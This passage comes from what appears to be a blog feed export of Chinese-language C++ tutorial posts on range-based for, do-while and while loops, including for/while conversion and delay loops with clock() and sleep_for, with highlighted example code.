class="comment">// fruit 是 std::string 的副本</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; fruit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 使用引用修改元素 (auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores = &#123;<span class="number">70</span>, <span class="number">85</span>, <span class="number">90</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original scores:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; score_ref : scores) &#123; <span class="comment">// score_ref 是元素的引用</span></span><br><span class="line">        score_ref += <span class="number">5</span>; <span class="comment">// 给每个分数加 5</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores after adding 5:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> score : scores) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score; <span class="comment">// 输出修改后的分数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 使用常量引用进行只读访问 (const auto&amp;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading scores (const auto&amp;):&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; score_cref : scores) &#123;</span><br><span class="line">        <span class="comment">// score_cref += 1; // 错误! 不能通过常量引用修改</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; score_cref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  <strong>简洁:</strong> 代码更短，意图更清晰（“对范围中的每个元素做某事”）。</li><li>  <strong>安全:</strong> 避免了手动管理索引或迭代器可能导致的错误（如越界访问、迭代器失效等）。</li><li>  <strong>通用:</strong> 适用于所有定义了 <code>begin()</code> 和 <code>end()</code> 的标准容器以及内置数组和初始化列表。</li></ul><p><strong>局限性:</strong></p><ul><li><strong>无法直接获取索引:</strong> 如果在循环中需要知道当前元素的索引，基于范围的 for 循环本身不提供这个信息。需要额外维护一个计数器变量。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> val : data) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Index &quot;</span> &lt;&lt; index &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    index++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>遍历整个范围:</strong> 它总是从头到尾遍历整个范围。如果需要更复杂的遍历模式（如反向、跳跃、只遍历部分范围），传统的 <code>for</code> 循环或 <code>while</code> 循环配合迭代器可能更合适。</li><li>  <strong>修改容器大小:</strong> 在循环体内修改容器的大小（例如，在 <code>vector</code> 中 <code>push_back</code> 或 <code>erase</code>）通常是不安全的，可能导致迭代器失效和未定义行为。基于范围的 for 循环不适合这种情况。</li></ul><p><strong>总结:</strong></p><p>基于范围的 <code>for</code> 循环是 C++11 提供的一个非常有用的特性，极大地简化了对序列中所有元素的遍历操作。在不需要索引且需要遍历整个序列的情况下，它通常是比传统 <code>for</code> 循环更优选、更安全、更易读的选择。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.3 do while循环</title>
      <link href="2025/04/26/5.3_do_while%E5%BE%AA%E7%8E%AF/"/>
      <url>2025/04/26/5.3_do_while%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<p><code>do while</code> 循环是 C++ 提供的第三种循环结构。它与 <code>while</code> 循环非常相似，但有一个关键区别：<code>do while</code> 循环是**出口条件循环 (Exit-Condition Loop)**，而 <code>while</code> 循环是入口条件循环。</p><p>这意味着 <code>do while</code> 循环会<strong>先执行一次循环体</strong>，<strong>然后再</strong>检查测试条件。只要条件为 <code>true</code>，循环就会继续执行。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">while</span> (test_condition); <span class="comment">// 注意这里的条件后面必须有分号 ;</span></span><br></pre></td></tr></table></figure><p>或者如果循环体只有一条语句（虽然不常见，且为了清晰通常还是用花括号）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    single_statement;</span><br><span class="line"><span class="keyword">while</span> (test_condition); </span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 执行循环体中的语句。</li><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，回到步骤 1。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，循环终止，执行循环后面的代码。</li></ol><p><strong>关键点:</strong></p><ul><li>  <strong>至少执行一次:</strong> 由于条件是在循环体执行之后检查的，<code>do while</code> 循环的循环体<strong>至少会执行一次</strong>，即使条件初始就为 <code>false</code>。</li><li>  <strong>分号:</strong> <code>while (test_condition)</code> 后面必须有一个分号 <code>;</code>。</li><li>  <strong>适用场景:</strong> 当你需要确保循环体中的代码至少执行一次时，<code>do while</code> 循环是理想的选择。例如，获取用户输入并验证，至少需要获取一次输入才能进行验证。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：要求用户输入一个正数</span></span><br><span class="line">    <span class="comment">// 循环体至少执行一次以获取输入</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a positive number: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number;</span><br><span class="line">        <span class="keyword">if</span> (number &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please try again.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (number &lt;= <span class="number">0</span>); <span class="comment">// 条件在输入之后检查</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered the positive number: &quot;</span> &lt;&lt; number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较: 如果使用 while，需要先获取一次输入</span></span><br><span class="line">    <span class="comment">// int number_while;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;\nEnter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// while (number_while &lt;= 0) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;;</span></span><br><span class="line">    <span class="comment">//     std::cin &gt;&gt; number_while;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 即使条件初始为 false，循环体也执行一次</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这行会执行</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (count &lt; <span class="number">5</span>); <span class="comment">// 第一次检查时 count 是 6, 条件为 false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After do-while loop, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count 变为 6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>与 <code>while</code> 和 <code>for</code> 的比较:</strong></p><ul><li>  <strong><code>while</code>:</strong> 入口条件，可能一次都不执行。</li><li>  <strong><code>for</code>:</strong> 通常用于计数或已知迭代次数，结构包含初始化、条件、更新。</li><li>  <strong><code>do while</code>:</strong> 出口条件，保证至少执行一次。</li></ul><p>根据循环逻辑选择最合适的循环结构可以使代码更清晰、更易于理解。如果需要确保操作至少发生一次（如菜单选择、输入验证），<code>do while</code> 是一个很好的选择。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.2 while循环</title>
      <link href="2025/04/26/5.2_while%E5%BE%AA%E7%8E%AF/"/>
      <url>2025/04/26/5.2_while%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<p><code>while</code> 循环是 C++ 中另一种重要的循环结构。与 <code>for</code> 循环不同，<code>while</code> 循环在结构上更简单，它只包含一个**测试条件 (Test Condition)**。只要该条件为 <code>true</code>，循环体就会一直执行。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (test_condition) &#123;</span><br><span class="line">    <span class="comment">// 循环体 (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者如果循环体只有一条语句</span></span><br><span class="line"><span class="keyword">while</span> (test_condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 计算 <code>test_condition</code>。</li><li> 如果 <code>test_condition</code> 为 <code>false</code>，跳出循环，执行循环后面的代码。</li><li> 如果 <code>test_condition</code> 为 <code>true</code>，执行循环体中的语句。</li><li> 回到步骤 1。</li></ol><p><strong>关键点:</strong></p><ul><li>  <code>while</code> 循环是一种**入口条件循环 (Entry-Condition Loop)**，即在每次执行循环体之前检查条件。如果第一次检查条件就为 <code>false</code>，则循环体一次也不会执行。</li><li>  循环体内部<strong>必须</strong>有能够影响 <code>test_condition</code> 的语句（例如修改用于判断的变量），否则如果条件初始为 <code>true</code>，循环将永远不会停止，形成**无限循环 (Infinite Loop)**。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 while 循环打印数字 0 到 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counting with while (0-4):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">5</span>) &#123; <span class="comment">// 1. 测试条件</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 2. 循环体</span></span><br><span class="line">        count++; <span class="comment">// 3. 更新条件变量 (非常重要!)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：等待用户输入特定字符</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (response != <span class="string">&#x27;y&#x27;</span> &amp;&amp; response != <span class="string">&#x27;Y&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-2-1-for与while"><a href="#5-2-1-for与while" class="headerlink" title="5.2.1 for与while"></a>5.2.1 for与while</h2><p><code>for</code> 循环和 <code>while</code> 循环在很多情况下是可以互换的，因为它们都可以用来实现基于条件的重复执行。</p><p><strong>转换关系:</strong></p><p>一个典型的 <code>for</code> 循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    body;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以等价地转换为 <code>while</code> 循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">initialization; <span class="comment">// 初始化移到循环之前</span></span><br><span class="line"><span class="keyword">while</span> (test_condition) &#123; <span class="comment">// 测试条件保持不变</span></span><br><span class="line">    body;</span><br><span class="line">    update; <span class="comment">// 更新移到循环体的末尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择依据:</strong></p><ul><li><strong><code>for</code> 循环:</strong><ul><li>  <strong>优点:</strong> 将初始化、测试和更新逻辑集中在循环头部，结构清晰，特别适用于<strong>计数循环</strong>（循环次数已知或易于计算）或需要按固定步长迭代的情况。</li><li>  <strong>适用场景:</strong> 遍历数组、按索引处理字符串、执行固定次数的操作。</li></ul></li><li><strong><code>while</code> 循环:</strong><ul><li>  <strong>优点:</strong> 结构更简单，只关注循环条件，适用于循环次数<strong>不确定</strong>，依赖于某个事件或状态改变的情况。</li><li>  <strong>适用场景:</strong> 等待用户输入、读取文件直到结束、处理链表、当循环条件比计数器更新更重要时。</li></ul></li></ul><p><strong>示例 (两种循环实现相同功能):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 for 循环计算 1 到 5 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum_for = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        sum_for += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using for: &quot;</span> &lt;&lt; sum_for &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 while 循环计算 1 到 5 的和</span></span><br><span class="line">    <span class="keyword">int</span> sum_while = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i_while = <span class="number">1</span>; <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">while</span> (i_while &lt;= <span class="number">5</span>) &#123; <span class="comment">// 测试条件</span></span><br><span class="line">        sum_while += i_while;</span><br><span class="line">        i_while++; <span class="comment">// 更新</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum using while: &quot;</span> &lt;&lt; sum_while &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然两者可以转换，但选择更自然地表达循环意图的结构可以提高代码的可读性。</p><h2 id="5-2-2-等待一段时间：编写延时循环"><a href="#5-2-2-等待一段时间：编写延时循环" class="headerlink" title="5.2.2 等待一段时间：编写延时循环"></a>5.2.2 等待一段时间：编写延时循环</h2><p>有时我们需要让程序暂停执行一段时间。虽然有更精确、更现代的方法（如 C++11 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 库），但可以使用循环来实现简单的、基于处理器时间的**延时循环 (Delay Loop)**。</p><p>这种方法<strong>不精确且不推荐</strong>用于实际的精确延时，因为它：</p><ul><li>  <strong>依赖于处理器速度:</strong> 在快的 CPU 上执行时间短，在慢的 CPU 上执行时间长。</li><li>  <strong>受编译器优化影响:</strong> 编译器可能会识别出循环体为空或无副作用，并将其完全优化掉。</li><li>  <strong>浪费 CPU 资源:</strong> 循环在空转，消耗 CPU 时间，无法执行其他有用任务。</li></ul><p><strong>基本思路:</strong> 执行一个已知需要一定时间的空循环或简单操作的循环。</p><p><strong>示例 (使用 <code>&lt;ctime&gt;</code> 库):</strong></p><p><code>&lt;ctime&gt;</code> (或 C 的 <code>&lt;time.h&gt;</code>) 库提供了一些与时间相关的函数，可以用来实现稍微好一点（但仍不理想）的延时。</p><ul><li>  <code>clock()</code>: 返回程序启动以来所用的<strong>时钟计时单元 (clock ticks)</strong> 数。</li><li>  <code>CLOCKS_PER_SEC</code>: 一个常量，表示每秒包含的时钟计时单元数。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt; // 为了 clock() 和 CLOCKS_PER_SEC</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> delay_seconds = <span class="number">2.5f</span>; <span class="comment">// 期望延时 2.5 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取开始时间</span></span><br><span class="line">    <span class="keyword">clock_t</span> start_time = clock(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算目标结束时间 (以 clock ticks 为单位)</span></span><br><span class="line">    <span class="keyword">clock_t</span> target_ticks = delay_seconds * CLOCKS_PER_SEC; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环直到经过了足够多的 clock ticks</span></span><br><span class="line">    <span class="keyword">while</span> (clock() &lt; start_time + target_ticks) &#123;</span><br><span class="line">        <span class="comment">// 循环体可以为空，或者执行一些轻量操作</span></span><br><span class="line">        <span class="comment">// ; // 空语句</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Delay finished after approximately &quot;</span> &lt;&lt; delay_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个简单的空循环延时 (非常不精确)</span></span><br><span class="line">    <span class="comment">// long wait = 0;</span></span><br><span class="line">    <span class="comment">// while (wait &lt; 100000000) &#123; // 循环次数需要根据机器调整</span></span><br><span class="line">    <span class="comment">//     wait++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>再次强调:</strong> 对于需要精确延时或暂停执行而不浪费 CPU 的场景，应使用 C++11 及更高版本提供的 <code>&lt;chrono&gt;</code> 和 <code>&lt;thread&gt;</code> 中的 <code>std::this_thread::sleep_for()</code> 或 <code>std::this_thread::sleep_until()</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt; // 为了时间单位 (e.g., seconds, milliseconds)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt; // 为了 std::this_thread::sleep_for</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting modern delay...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 延时 2 秒 500 毫秒</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::seconds <span class="title">sec</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="function">chrono::milliseconds <span class="title">ms</span><span class="params">(<span class="number">500</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::this_thread::sleep_for(sec + ms); <span class="comment">// 线程休眠，不消耗 CPU</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Modern delay finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个现代方法更精确、可移植性更好，并且不会浪费 CPU 周期。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
